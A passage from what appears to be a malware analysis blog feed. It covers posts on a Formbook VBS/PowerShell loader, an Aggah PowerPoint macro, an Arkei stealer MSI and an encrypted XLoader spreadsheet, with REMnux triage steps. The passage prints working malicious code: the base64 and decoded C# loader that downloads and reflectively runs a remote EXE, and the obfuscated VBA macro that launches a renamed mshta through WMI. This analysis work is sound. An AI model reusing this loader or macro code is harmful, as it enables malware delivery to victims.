&quot;dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5JTzt1c2luZyBTeXN0ZW0uTmV0O3VzaW5nIFN5c3RlbS5SZWZsZWN0aW9uO3VzaW5nIFN5c3RlbS5UaHJlYWRpbmc7bmFtZXNwYWNlIG5TaGZWbER5akYuaXFCTGZDckZrQQp7cHVibGljIGNsYXNzIEJaVWxGTnh0R2d0Qk9xRFFQaVdSZVNpZ28Ke3ByaXZhdGUgY29uc3Qgc3RyaW5nIHl0WG5XV0dBSG1ERGtsdGlhbVZCYmtvbnI9Imh0dHBzOi8vdHJhbnNmZXIuc2gvZ2V0LzdFdVhxNS9SWUpHSkhKREdIUi5leGUiO3ByaXZhdGUgTWVtb3J5U3RyZWFtIFlTdE9jV0ljSGNKdElVdE9pbFpaSlhsYkE9bmV3IE1lbW9yeVN0cmVhbSgpO1tTVEFUaHJlYWRdCnB1YmxpYyB2b2lkIFpia2lwRVpsTnhqcm93UnZQTmx1cURma1UoKQp7bWRVcUtXd3pPUXJDdHlLVnRJaEdOUVhVaSgpO1pOV3JQbk55ZlBMaXpwUU1Sa2xXckNGdWooKTt9CnByaXZhdGUgdm9pZCBaTldyUG5OeWZQTGl6cFFNUmtsV3JDRnVqKCkKe2J5dGVbXWJ1ZmZlcj1ZU3RPY1dJY0hjSnRJVXRPaWxaWkpYbGJBLlRvQXJyYXkoKTtBc3NlbWJseSBhc3NlbWJseT1udWxsO2lmKEVudmlyb25tZW50LlZlcnNpb24uTWFqb3I+PTQpCntNZXRob2RJbmZvIG1ldGhvZD1UeXBlLkdldFR5cGUoIlN5c3RlbS5SZWZsZWN0aW9uLlJ1bnRpbWVBc3NlbWJseSIpLkdldE1ldGhvZCgibkxvYWRJbWFnZSIsQmluZGluZ0ZsYWdzLk5vblB1YmxpY3xCaW5kaW5nRmxhZ3MuU3RhdGljKTthc3NlbWJseT0oQXNzZW1ibHkpbWV0aG9kLkludm9rZShudWxsLG5ldyBvYmplY3RbXXtidWZmZXIsbnVsbCxudWxsLG51bGwsZmFsc2UsZmFsc2UsbnVsbH0pO31lbHNlCntNZXRob2RJbmZvIG1ldGhvZD1UeXBlLkdldFR5cGUoIlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IikuR2V0TWV0aG9kKCJuTG9hZEltYWdlIixCaW5kaW5nRmxhZ3MuTm9uUHVibGljfEJpbmRpbmdGbGFncy5TdGF0aWMpO2Fzc2VtYmx5PShBc3NlbWJseSltZXRob2QuSW52b2tlKG51bGwsbmV3IG9iamVjdFtde2J1ZmZlcixudWxsLG51bGwsbnVsbCxmYWxzZX0pO30Kb2JqZWN0W11hcmdzPW5ldyBvYmplY3RbMV07aWYoYXNzZW1ibHkuRW50cnlQb2ludC5HZXRQYXJhbWV0ZXJzKCkuTGVuZ3RoPT0wKQphcmdzPW51bGw7YXNzZW1ibHkuRW50cnlQb2ludC5JbnZva2UobnVsbCxhcmdzKTt9CnByaXZhdGUgdm9pZCBtZFVxS1d3ek9RckN0eUtWdEloR05RWFVpKCkKe1dlYlJlcXVlc3QgcmVxdWVzdD1XZWJSZXF1ZXN0LkNyZWF0ZSh5dFhuV1dHQUhtRERrbHRpYW1WQmJrb25yKTtXZWJSZXNwb25zZSByZXNwb25zZT1yZXF1ZXN0LkdldFJlc3BvbnNlKCk7dXNpbmcoU3RyZWFtIHdlYl9zdHJlYW09cmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKe2J5dGVbXWJ1ZmZlcj1uZXcgYnl0ZVs4MTkyXTtpbnQgcmVhZD0wO3doaWxlKChyZWFkPXdlYl9zdHJlYW0uUmVhZChidWZmZXIsMCxidWZmZXIuTGVuZ3RoKSk+MCkKe1lTdE9jV0ljSGNKdElVdE9pbFpaSlhsYkEuV3JpdGUoYnVmZmVyLDAscmVhZCk7fX0KcmVzcG9uc2UuQ2xvc2UoKTt9fX0=&quot;;$dec = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($whatever));Add-Type -TypeDefinition $dec;$instance = New-Object nShfVlDyjF.iqBLfCrFkA.BZUlFNxtGgtBOqDQPiWReSigo;$instance.ZbkipEZlNxjrowRvPNluqDfkU();The PowerShell code is fairly brief. The $whatever variable contains base64-encoded text that soon gets decoded into $dec. Immediately after, PowerShell calls Add-Type and specified the decoded text as a TypeDefinition. This action assumes code passed into the TypeDefinition is .NET code, and PowerShell compiles that code into a .NET DLL module using the relevant compiler. After the .NET type gets compiled and added into PowerShell, the script creates an object of the type nShfVlDyjF.iqBLfCrFkA.BZUlFNxtGgtBOqDQPiWReSigo and calls the function ZbkipEZlNxjrowRvPNluqDfkU(). Sidebar- I’ve heard folks over the last few years say “PowerShell is dead, .NET is where the modern tradecraft is”. I strongly disagree, because I see PowerShell exploitation every day and modern adversaries simply mix PowerShell with .NET technologies.The question now is, what code went into that Add-Type call? We can decode the base64 chunk ourselves, revealing some C# code. I’ve gone ahead and added whitespace and renamed some of the function calls to make it easier to read.using System;using System.IO;using System.Net;using System.Reflection;using System.Threading;namespace nShfVlDyjF.iqBLfCrFkA{ public class BZUlFNxtGgtBOqDQPiWReSigo { private const string exe_url=&quot;hxxps://transfer[.]sh/get/7EuXq5/RYJGJHJDGHR.exe&quot;; private MemoryStream exe_memory_stream=new MemoryStream(); [STAThread] public void ZbkipEZlNxjrowRvPNluqDfkU() { download_exe_to_memory_stream(); memory_stream_to_reflective_load(); } private void memory_stream_to_reflective_load() { byte[]buffer=exe_memory_stream.ToArray(); Assembly assembly=null; if(Environment.Version.Major&amp;gt;=4) { MethodInfo method=Type.GetType(&quot;System.Reflection.RuntimeAssembly&quot;).GetMethod(&quot;nLoadImage&quot;,BindingFlags.NonPublic|BindingFlags.Static);assembly=(Assembly)method.Invoke(null,new object[]{buffer,null,null,null,false,false,null}); } else { MethodInfo method=Type.GetType(&quot;System.Reflection.Assembly&quot;).GetMethod(&quot;nLoadImage&quot;,BindingFlags.NonPublic|BindingFlags.Static);assembly=(Assembly)method.Invoke(null,new object[]{buffer,null,null,null,false}); } object[]args=new object[1]; if(assembly.EntryPoint.GetParameters().Length==0) args=null;assembly.EntryPoint.Invoke(null,args); } private void download_exe_to_memory_stream() { WebRequest request=WebRequest.Create(exe_url); WebResponse response=request.GetResponse(); using(Stream web_stream=response.GetResponseStream()) { byte[]buffer=new byte[8192]; int read=0; while((read=web_stream.Read(buffer,0,buffer.Length))&amp;gt;0) { exe_memory_stream.Write(buffer,0,read); } } response.Close(); } }}The ZbkipEZlNxjrowRvPNluqDfkU() function called branches into two additional functions. The first one downloads a Windows EXE file and pushes the contents into a MemoryStream object. The second function then takes the MemoryStream and loads its contents using .NET reflection. The method it uses to do reflective loading is slightly unusual. I typically see malware using [System.Reflection.Assembly]::Load(), LoadFile(), or LoadFrom() to load an EXE or DLL into memory. In this case, the malware uses a method called nLoadImage(). This specific method is part of the Reflection.Assembly or Reflection.RuntimeAssembly classes and is usually called by the normal Load() functions. This malware skips the normal loading method and specifically calls the underlying thing it relies on instead.So far we have this execution pattern: wscript.exe &amp;gt; powershell.exe &amp;gt; compile C# &amp;gt; execute C# code to download and execute an EXE inside powershell.exe.Getting to the next stage, we can tear into the downloaded EXE, RYJGJHJDGHR.exe.RYJGJHJDGHR.exe, I can’t even spell itLet’s figure out what kind of EXE we have using diec.remnux@remnux:~/cases/formbook-vbs$ diec RYJGJHJDGHR.exe PE32 Protector: Eziriz .NET Reactor(6.x.x.x)[By Dr.FarFar] Library: .NET(v4.0.30319)[-] Linker: Microsoft Linker(48.0)[GUI32]Immediately, Detect-It-Easy tells us we’re dealing with a .NET executable obfuscated with .NET Reactor. This is some kinda-good news because we can easily compile the executable to source even if that source is obfuscated. Since I can’t include the entire source of the executable here, I want to go ahead and share the hash and VT link: 51c7f45ca2d7d26be5e7d6b51aec8e0a. From here on in, I’ll show portions of the decompiled code as relevant. To obtain the decompiled code, we can use ilspycmd.ilspycmd RYJGJHJDGHR.exe &amp;gt; RYJGJHJDGHR.decompiled.csThe big point to focus on is the Main() method, which is the entry point for this stage. The function contains an EXE and DLL that have both been encoded into base64 with some characters replaced for basic obfuscation.After the encoded chunks there is also a chunk of code containing a process path:obj = new object[4]{ &quot;ERERRWRWRWSGGSAGDHHJHJBNCBNCBN&quot;.Replace(&quot;ERERRWRWRWSGGSAGDHHJHJBNCBNCBN&quot;, &quot;C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\aspnet_compiler.exe&quot;), empty, array, true};Having the pattern of EXE + DLL + process name is usually a sign of upcoming process injection in the samples I analyze. I assume the DLL will be injection code, the process name is the process a payload will be injected into, and the EXE will be the final payload. By doing find/replace and base64 decoding we got the payload.remnux@remnux:~/cases/formbook-vbs$ head -c 100 payload.b64 TVpFUugAAAAAWIPoCYvIg8A8iwADwYPAKAMI/+GQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuAAAAA4fug4AtAnNIbgBremnux@remnux:~/cases/formbook-vbs$ cat payload.b64 | base64 -d &amp;gt; payload.binremnux@remnux:~/cases/formbook-vbs$ diec payload.bin PE32 Compiler: MASM(10.00.40219)[-] Linker: Microsoft Linker(10.0)[GUI32]The extracted EXE is a native Windows binary and not .NET so it’ll take a bit more to tear apart. The good news is that we can identify it as Formbook using YARA, though!remnux@remnux:~/cases/formbook-vbs$ yara-rules payload.bin CRC32b_poly_Constant payload.binRIPEMD160_Constants payload.binSHA1_Constants payload.binmaldoc_getEIP_method_1 payload.binFormbook payload.binIsPE32 payload.binIsWindowsGUI payload.binIsPacked payload.binHasOverlay payload.binImportTableIsBad payload.binHasRichSignature payload.binMicrosoft_Visual_Cpp_v50v60_MFC payload.binBorland_Delphi_30_additional payload.binBorland_Delphi_30_ payload.binBorland_Delphi_v40_v50 payload.binBorland_Delphi_v30 payload.binBorland_Delphi_DLL payload.binFurther workThis is where I want to stop for the night because I’ve achieved my goal of getting the end payload and identifying it. If you want to continue and learn more, I encourage you to try to find the injector code in RYJGJHJDGHR.exe, decode it, and decompile it to source. If you want to learn more about YARA, try to figure out how YARA knows the payload.bin binary is Formbook. Thank you for reading!" }, { "title": "Aggah PPAM macros renaming MSHTA", "url": "/aggah-ppam-renamed-mshta/", "categories": "malware", "tags": "malware, ppam, macro, mshta, aggah", "date": "2022-03-04 00:00:00 +0000", "snippet": "In this quick post I’m taking a look at a PowerPoint file with macros on board! According to MalwareBazaar’s tags, it was reported in association with the group “Aggah”. If you want to follow along at home, the sample is here in MalwareBazaar: https://bazaar.abuse.ch/sample/6b4970c6016fbff8665932c69d95203863c7ea46ae0f86e02525a4694f60f115/.Triaging the fileAs usual, let’s make sure we have a valid PPAM file. We can do this a few ways, I’ll settle for file and diec here.remnux@remnux:~/cases/aggah$ file rfq.ppam rfq.ppam: Microsoft PowerPoint 2007+remnux@remnux:~/cases/aggah$ diec rfq.ppam Binary Archive: Zip(2.0)[34.9%,36 files] Data: ZIP archiveThe diec output might throw some folks off, but it’s expected in this case. Office 2007+ documents are a collection of XML files stashed in a structured zip archive.Counting macrosTo get the macro code, we can employ olevba.remnux@remnux:~/cases/aggah$ olevba rfq.ppam olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools===============================================================================FILE: rfq.ppamType: OpenXMLWARNING For now, VBA stomping cannot be detected for files in memory-------------------------------------------------------------------------------VBA MACRO Module1.bas in file: ppt/ueryeur.n - OLE stream: &#39;VBA/Module1&#39;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Sub Auto_Open()MsgBox &quot;error! Re-install office&quot;Set kaosk = GetObject(&quot;new:0D43FE01-F093-11CF-8940-00A0C9054228&quot;)kaosk.copyfile &quot;C:\\Windows\\System32\\mshta.exe&quot;, &quot;C:\\\\ProgramData\\\\cond.com&quot;, Truekokokasd = &quot;C:mmmmmmmmDLASDLlrogramDatammmmmmmmcond0lol hmotamotaDLASDLls:sexsexmislalmislalmislal0bimotaly0lolsex&quot; + &quot;itjjjskrr&quot;kokokasd = Replace(kokokasd, &quot;DLASDLl&quot;, &quot;p&quot;)kokokasd = Replace(kokokasd, &quot;mislal&quot;, &quot;w&quot;)kokokasd = Replace(kokokasd, &quot;mota&quot;, &quot;t&quot;)kokokasd = Replace(kokokasd, &quot;0&quot;, &quot;.&quot;)kokokasd = Replace(kokokasd, &quot;jdaudwoks&quot;, &quot;e&quot;)kokokasd = Replace(kokokasd, &quot;lol&quot;, &quot;com&quot;)kokokasd = Replace(kokokasd, &quot;sex&quot;, &quot;/&quot;)kokokasd = Replace(kokokasd, &quot;mmmm&quot;, &quot;\\&quot;)adjaiwdjiaskd = &quot;01n2g2tkokokasd:&quot;adjaiwdjiaskd = Replace(adjaiwdjiaskd, &quot;0&quot;, &quot;W&quot;)adjaiwdjiaskd = Replace(adjaiwdjiaskd, &quot;1&quot;, &quot;i&quot;)adjaiwdjiaskd = Replace(adjaiwdjiaskd, &quot;2&quot;, &quot;m&quot;)adjaiwdjiaskd = Replace(adjaiwdjiaskd, &quot;kokokasd&quot;, &quot;s&quot;)aksdokasodkoaksd = &quot;aksdokasodkoaksd5nooo_Proce66&quot;aksdokasodkoaksd = Replace(aksdokasodkoaksd, &quot;aksdokasodkoaksd&quot;, &quot;W&quot;)aksdokasodkoaksd = Replace(aksdokasodkoaksd, &quot;5&quot;, &quot;i&quot;)aksdokasodkoaksd = Replace(aksdokasodkoaksd, &quot;ooo&quot;, &quot;32&quot;)aksdokasodkoaksd = Replace(aksdokasodkoaksd, &quot;6&quot;, &quot;s&quot;)GetObject(adjaiwdjiaskd). _Get(aksdokasodkoaksd). _Create _kokokasd, _Null, _Null, _pidEnd Sub+----------+--------------------+---------------------------------------------+|Type |Keyword |Description |+----------+--------------------+---------------------------------------------+|AutoExec |Auto_Open |Runs when the Excel Workbook is opened ||Suspicious|copyfile |May copy a file ||Suspicious|Create |May execute file or a system command through || | |WMI ||Suspicious|GetObject |May get an OLE object with a running instance||Suspicious|Windows |May enumerate application windows (if || | |combined with Shell.Application object) ||Suspicious|Hex Strings |Hex-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) ||Suspicious|Base64 Strings |Base64-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) ||IOC |mshta.exe |Executable file name |+----------+--------------------+---------------------------------------------+There are a few interesting things in the code that stand out. First, a macro runs when PPAM opens because the macro defines a Auto_Open() function. Next, the macro copies mshta.exe to C:\\ProgramData\\cond.com. This is a simple and lazy way to evade detection rules that are brittle. Detection rules just checking for mshta.exe by name without additional binary property checks will get thrown off by this technique. Next, there looks like a ton of string obfuscation via replacement operations. We can simplify down the obfuscation showing these strings:kokokasd = &quot;C:\\\\programData\\\\cond.com hxxps://www.bitly[.]com/itjjjskrr&quot;adjaiwdjiaskd = &quot;Winmgmts:&quot;aksdokasodkoaksd = &quot;Win32_Process&quot;Given these strings we can assume one of the next steps will spawn cond.com, the renamed mshta, to visit a bitly link and process malicious content in a HTA file. Judging from the string Win32_Process, the name of the WMI Process class, we can assume the cond.com process will execute via WMI, making it spawn from wmiprvse.exe. From here the trail dried up for me here because it didn’t look like the sandboxes got a copy of the HTA. It likely didn’t successfully execute or download.Thanks for reading!" }, { "title": "Analyzing a Stealer MSI using msitools", "url": "/analyzing-stealer-msi-using-msitools/", "categories": "malware", "tags": "malware, msitools, stealer, msi", "date": "2022-02-12 00:00:00 +0000", "snippet": "This post is dedicated to Josh Rickard (@MSAdministrator on Twitter) since his feedback on my blog posts has cut my triage time on MSI files down in a massive way! After writing an analysis of a MSI payload distributing njRAT, Josh hit me up on Twitter to suggest a Python tool he made to analyze MSIs, msi-utils with the caveat that it only worked on macOS. I set off to figure out why it only worked on macOS and, long story short, the journey led me to the msitools package on Linux. I’ll use it in this post to analyze this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/1f7830f0117f694b87ae81caed022c82174f9a8d158a0b8e127154e17d1600cc/.Getting msitools 2022-02-14 Edit: msitools is now included in REMnux! To get it run remnux upgrade.The msitools package isn’t installed by default in REMnux, so we have to go install it ourselves. This is easily done using apt.sudo apt updatesudo apt install msitoolsOnce the package is installed, we can move on to ripping apart MSI files!Triage the MSI SampleThe Detect-It-Easy and file output confirm we do have a MSI file.remnux@remnux:~/cases/arkei-msi$ diec po.msi filetype: Binaryarch: NOEXECmode: Unknownendianess: LEtype: Unknown installer: Microsoft Installer(MSI)remnux@remnux:~/cases/arkei-msi$ file po.msi po.msi: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, MSI Installer, Code page: 1252, Title: My App 21.9.9.16, Subject: My App, Author: My App, Keywords: Installer, Template: Intel;1033, Revision Number: {9CE926D0-E487-4691-A805-7922D5CC3D39}, Create Time/Date: Thu Feb 18 21:32:30 2021, Last Saved Time/Date: Thu Feb 18 21:32:30 2021, Number of Pages: 200, Number of Words: 12, Name of Creating Application: MSI Wrapper (10.0.50.0), Security: 2More specifically, the data from file indicates the MSI file was created by a tool named “MSI Wrapper (10.0.50.0)”. The tool is likely the one from this web site: https://www.exemsi.com/Enumerating MSI Tables and StreamsWe can start the analysis using msiinfo to get some information about the file. We definitely want to know what table and stream structures we can expect within the MSI.remnux@remnux:~/cases/arkei-msi$ msiinfo tables po.msi _SummaryInformation_ForceCodepage_ValidationAdminExecuteSequenceAdminUISequenceAdvtExecuteSequenceBinaryComponentDirectoryCustomActionFeatureFeatureComponentsFileIconInstallExecuteSequenceInstallUISequenceLaunchConditionMediaPropertyRegistryUpgraderemnux@remnux:~/cases/arkei-msi$ msiinfo streams po.msi Icon.ProductIconBinary.bz.CustomActionDllBinary.bz.WrappedSetupProgramSummaryInformationDocumentSummaryInformationAs MSI files go, this one isn’t particularly complex. Depending on the product used, there can be a lot more data in tables and streams. There are a few things we definitely want to hit during our analysis here. First, we need to examine the contents of the “CustomAction” table at the very least. The CustomAction table is often interesting with malicious installers as adversaries may hide code to execute within the CustomAction table. PurpleFox malware has placed JScript to execute in this table in the past and other malware families have used the table to specify that a malicious DLL should be executed during installation. TDumping Tables and StreamsWe can dump out all of the contents using msidump.remnux@remnux:~/cases/arkei-msi$ msidump -s -t po.msi Exporting table _SummaryInformation...Exporting table _ForceCodepage...Exporting table _Validation...Exporting table AdminExecuteSequence...Exporting table AdminUISequence...Exporting table AdvtExecuteSequence...Exporting table Binary...Exporting table Component...Exporting table Directory...Exporting table CustomAction...Exporting table Feature...Exporting table FeatureComponents...Exporting table File...Exporting table Icon...Exporting table InstallExecuteSequence...Exporting table InstallUISequence...Exporting table LaunchCondition...Exporting table Media...Exporting table Property...Exporting table Registry...Exporting table Upgrade...Exporting stream Icon.ProductIcon...Exporting stream Binary.bz.CustomActionDll...Exporting stream Binary.bz.WrappedSetupProgram...Exporting stream SummaryInformation...Exporting stream DocumentSummaryInformation...remnux@remnux:~/cases/arkei-msi$ ls -ltotal 4720-rw-rw-r-- 1 remnux remnux 243 Feb 12 22:44 AdminExecuteSequence.idt-rw-rw-r-- 1 remnux remnux 141 Feb 12 22:44 AdminUISequence.idt-rw-rw-r-- 1 remnux remnux 225 Feb 12 22:44 AdvtExecuteSequence.idtdrwxrwxr-x 2 remnux remnux 4096 Feb 12 22:44 Binary-rw-rw-r-- 1 remnux remnux 132 Feb 12 22:44 Binary.idt-rw-rw-r-- 1 remnux remnux 202 Feb 12 22:44 Component.idt-rw-rw-r-- 1 remnux remnux 1093 Feb 12 22:44 CustomAction.idt...Each of the IDT files contain data from the tables, while two folders named “Binary” and “_Streams” hold executable and stream data fetched from the MSI. First up, let’s inspect that CustomAction.idt file.Action Type Source Target ExtendedTypes72 i2 S72 S255 I4CustomAction Actionbz.EarlyInstallMain 1 bz.CustomActionDll _InstallMain@4 bz.EarlyInstallSetPropertyForDeferred1 51 bz.EarlyInstallFinish2 [BZ.INIFILE] bz.EarlyInstallFinish2 1 bz.CustomActionDll _InstallFinish2@4 bz.LateInstallPrepare 1 bz.CustomActionDll _InstallPrepare@4 bz.LateInstallSetPropertyForDeferred1 51 bz.LateInstallFinish1 [BZ.INIFILE] bz.LateInstallFinish1 3073 bz.CustomActionDll _InstallFinish1@4 bz.LateInstallSetPropertyForDeferred2 51 bz.LateInstallFinish2 [BZ.INIFILE] bz.LateInstallFinish2 3073 bz.CustomActionDll _InstallFinish2@4 bz.CheckReboot 1 bz.CustomActionDll _CheckReboot@4 bz.UninstallPrepare 1 bz.CustomActionDll _UninstallPrepare@4 bz.UninstallSetPropertyForDeferred1 51 bz.UninstallFinish1 [BZ.INIFILE] bz.UninstallFinish1 3073 bz.CustomActionDll _UninstallFinish1@4 bz.UninstallSetPropertyForDeferred2 51 bz.UninstallFinish2 [BZ.INIFILE] bz.UninstallFinish2 1025 bz.CustomActionDll _UninstallFinish2@4 bz.UninstallWrapped 1 bz.CustomActionDll _UninstallWrapped@4 The table contents look relatively normal as far as MSI files go. If there were malicious content here we’d see code chunks that we’d expect to see in JScript or VBScript files. Let’s go take a look at some other interesting tables. The Property table gives some more information.Property Values72 l0Property PropertyUpgradeCode {3FF46275-96F9-4EBF-9B1E-50CA97E8DB0E}ALLUSERS 1ARPNOREPAIR 1ARPNOMODIFY 1ARPPRODUCTICON ProductIconBZ.WRAPPED_REGISTRATION NoneBZ.VER 2922BZ.CURRENTDIR *SOURCEDIR*BZ.WRAPPED_APPID {1FC4DB72-5AB1-4002-B9B0-00FAA9B12D8E}BZ.COMPANYNAME EXEMSI.COMBZ.BASENAME NEnXoxoXxKaPjctW.exeBZ.ELEVATE_EXECUTABLE administratorsBZ.INSTALLMODE EARLYBZ.WRAPPERVERSION 10.0.50.0BZ.EXITCODE 0BZ.INSTALL_SUCCESS_CODES 0Manufacturer My AppProductCode {481C9516-0944-4A5D-B8F1-803936B5D792}ProductLanguage 1033ProductName My AppProductVersion 21.9.9.16SecureCustomProperties WIX_DOWNGRADE_DETECTED;WIX_UPGRADE_DETECTEDIt looks like the CompanyName for this MSI Wrapper is EXEMSI.COM, consistent with what we expected so far. The BaseName property looks to be NEnXoxoXxKaPjctW.exe. We haven’t seen this name anywhere else in the tables so far, so I’m going to guess there’s an archive or something inside a stream that contains the executable or content that downloads it. Let’s go look at the _Streams content.remnux@remnux:~/cases/arkei-msi/_Streams$ file *Binary.bz.CustomActionDll: PE32 executable (DLL) (GUI) Intel 80386, for MS WindowsBinary.bz.WrappedSetupProgram: Microsoft Cabinet archive data, Windows 2000/XP setup, 2059637 bytes, 1 file, at 0x2c +A &quot;NEnXoxoXxKaPjctW.exe&quot;, ID 5658, number 1, 64 datablocks, 0x1503 compressionDocumentSummaryInformation: dBase III DBT, version number 0, next free block index 65534Icon.ProductIcon: Targa image data - Map 32 x 19866 x 1 +1SummaryInformation: dBase III DBT, version number 0, next free block index 65534We have some executable content that looks interesting in _Streams. First, the file Binary.bz.CustomActionDll looks like it’s a Windows native DLL file. A “custom action DLL” is pretty common to see in MSI files from multiple different products. I commonly see this sort of DLL in MSIs made by AdvancedInstaller tools, and those are usually signed. The second interesting file is Binary.bz.WrappedSetupProgram. This looks like a Microsoft CAB file that we can unpack using 7z.remnux@remnux:~/cases/arkei-msi/_Streams$ 7z x Binary.bz.WrappedSetupProgram7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)Scanning the drive for archives:1 file, 2059637 bytes (2012 KiB)Extracting archive: Binary.bz.WrappedSetupProgram-- Path = Binary.bz.WrappedSetupProgramType = CabPhysical Size = 2059637Method = LZX:21Blocks = 1Volumes = 1Volume Index = 0ID = 5658Everything is OkSize: 2094224Compressed: 2059637remnux@remnux:~/cases/arkei-msi/_Streams$ ls -ltotal 4408-rw-rw-r-- 1 remnux remnux 212992 Feb 12 22:44 Binary.bz.CustomActionDll-rw-rw-r-- 1 remnux remnux 2059637 Feb 12 22:44 Binary.bz.WrappedSetupProgram-rw-rw-r-- 1 remnux remnux 2094224 Feb 9 14:17 NEnXoxoXxKaPjctW.exeAfter a life-affirming message from 7z, the tool successfully unpacked NEnXoxoXxKaPjctW.exe from the CAB. This is the EXE we were looking for after it was mentioned in Property.idt! Thus ends the MSI triage!Triage the EXEUsing Detect-It-Easy to identify the file helped find a stumbling block.remnux@remnux:~/cases/arkei-msi/_Streams$ diec NEnXoxoXxKaPjctW.exe filetype: PE32arch: I386mode: 32-bitendianess: LEtype: GUI protector: Obsidium(-)[-] linker: unknown(2.30)[GUI32]The EXE is protected/packed using Obsidium, a commercial packing tool. There’s probably a way to unpack it statically or with a debugger, but that’s going to take more effort than I want to put in tonight. The best way from here forward for me will be to lean on a sandbox report.How do we know it’s Arkei Stealer?The Tria.ge report for the sample indicates it found evidence of Arkei in the memory dump of process ID 1312, which corresponds to NEnXoxoXxKaPjctW.exe. Let’s inspect that memory dump with some YARA rules and see what we can find. After running the sample through YARA rules from the yara-rules and ditekshen repositories, I couldn’t find a match. I assume at this point that the YARA rule is internal/private to Hatching. So let’s see if we can find intelligence overlaps in the sandbox telemetry.The network activity from the report indicates the sample downloaded mozglue.dll, sqlite3.dll, nss3.dll, freebl3.dll, and a couple others. These DLLs are commonly downloaded and loaded into memory by stealers as they provide functionality to decrypt sensitive data within Mozilla Firefox and Chromium-based web browsers. This is common to Vidar and Arkei, and these two families are similar enough that one may be forked from the other. The network telemetry in the sandbox PCAP can also be helpful since it looks like there was a POST request. We can take a look at the data in Wireshark. In Wireshark, we want to filter on http protocol only so we can immediately find that POST request.To see the content of the POST, we can right-click on the POST request and follow the HTTP stream. Once we do that, we can see it looks like the malware uploaded a ZIP archive named USR1V37900ZM7Q.zip.Since this file is uploaded over HTTP, it stands to reason that we can carve it out of the network traffic and inspect the contents. We can do this easily with NetworkMiner. Once you open the PCAP in NetworkMiner, all the files get automatically reassembled and written to disk. To inspect one, right-click on the file and either “Open File” or “Open Folder”.After unpacking the ZIP we can find just a few files.remnux@remnux:~/cases/arkei-msi/network$ tree -a.├── History│   └── Firefox_n0kj3f68.default-release.txt├── screenshot.jpg├── system.txt└── USR1V37900ZM7Q.zipJust searching for “screenshot.jpg” + “system.txt” on Google will yield some hits on Oski stealer, and one on Vidar. This isn’t surprising as Oski reportedly shares some code with Vidar and Arkei.The Firefox and screenshot information will likely be self-explanatory, so let’s start with system.txt. Stealers commonly capture system configuration data within a text file and sometimes leave specific toolmarks/artifacts inside those files. For example, Raccoon often leaves its own name in a systeminfo text file. Previous versions of Vidar, such as in fumik0’s analysis, seem to store system information in a file named information.txt instead. This makes me think we’re actually somewhere in Oski stealer territory since it allegedly shares some code with Arkei. Lastly, there’s also a possibility this could be Mars stealer based on its similarity to Oski in this analysis as with Oski, there is a system.txt file.So why does any of this matter? It matters a bit for threat intelligence tracking and attribution to developers. This also shows the great challenge in threat intelligence of trying to interpret malware analysis findings and detection details when many malware tools fork from one another and share artifacts. In worst case scenarios analysts can make assessments based on severely flawed or dated information. In many cases, though, the data is “close enough” to still be useful. This can be seen in the Tria.ge report: no matter what the stealer is, the configuration is still parsed.Thanks for reading!" }, { "title": "XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets", "url": "/xloader-formbook-velvetsweatshop-spreadsheet/", "categories": "malware", "tags": "malware, xloader, formbook, xlsx, velvetsweatshop, equationeditor", "date": "2022-02-11 00:00:00 +0000", "snippet": "Just like with RTF documents, adversaries can use XLSX spreadsheets to exploit the Microsoft Office Equation Editor. To add a little bit of complication on top, adversaries also sometimes like to encrypt/password protect documents, but that doesn’t have to slow down our analysis too much. For this analysis I’m working with this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/91cf449506a9c3ade639027f6a38e99ee22d9cc7c2a1c4bc42fc8047185b8918/.Triaging the FileMalwareBazaar gave us a head start in asserting the document is a XLSX file. We can confirm this with Detect-It-Easy and file.remnux@remnux:~/cases/xloader-doc$ diec TW0091.xlsx filetype: Binaryarch: NOEXECmode: Unknownendianess: LEtype: Unknown archive: Microsoft Compound(MS Office 97-2003 or MSI etc.)remnux@remnux:~/cases/xloader-doc$ file TW0091.xlsx TW0091.xlsx: CDFV2 EncryptedThe file output indicates the XLSX file is encrypted, so step one is taking a crack at getting the decrypted document.Decrypting the SpreadsheetWe can give a good first shot at finding the document password using msoffcrypto-crack.py.remnux@remnux:~/cases/xloader-doc$ msoffcrypto-crack.py TW0091.xlsx Password found: VelvetSweatshopAnd just like that, we got a little lucky! The password for this document is VelvetSweatshop, which has some significance in MS Office documents. For more info you can hit up Google, but the basic gist is that Office documents encrypted with the password VelvetSweatshop will automatically decrypt themselves when opened in Office. This is an easy way to encrypt documents for distribution without having to worry about passing a password to the receiving party.To decrypt the document, we can pass that password into msoffcrypto-tool.remnux@remnux:~/cases/xloader-doc$ msoffcrypto-tool -p VelvetSweatshop TW0091.xlsx decrypted.xlsxremnux@remnux:~/cases/xloader-doc$ file decrypted.xlsx decrypted.xlsx: Microsoft Excel 2007+Alright, now we have a decrypted document to work with!Analyzing the Decrypted SpreadsheetA good first step with any MS Office file is to check for macro-based things with olevba.remnux@remnux:~/cases/xloader-doc$ olevba decrypted.xlsx olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools===============================================================================FILE: decrypted.xlsxType: OpenXMLNo VBA or XLM macros found.The output from olevba indicates there aren’t Visual Basic for Applications (VBA) macros or Excel 4.0 macros present. This leads me into thinking there may be OLE objects involved. We can take a look using oledump.py.remnux@remnux:~/cases/xloader-doc$ oledump.py decrypted.xlsx A: xl/embeddings/oleObject1.bin A1: 20 &#39;\\x01Ole&#39; A2: 1643 &#39;\\x01oLe10nAtIVe&#39;So it looks like we’ve got an OLE 